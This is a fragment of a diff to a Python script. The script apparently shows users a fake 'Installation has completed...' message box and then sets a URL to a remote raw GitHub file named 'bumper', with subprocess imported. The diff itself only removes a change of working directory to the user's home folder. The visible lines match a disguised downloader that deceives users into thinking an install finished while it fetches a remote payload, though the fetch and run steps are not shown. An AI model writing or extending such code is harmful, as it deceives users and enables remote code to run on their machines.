@@ -35,10 +35,6 @@ from tkinter import simpledialog
 
 import subprocess
 
-d = os.path.join(os.environ["HOMEPATH"], r"")
-
-os.chdir(d)
-
 messagebox.showinfo("System Message", "Installation has completed...")
 
 remote_url = 'https://raw.githubusercontent.com/Mood56467/889671/main/bumper'
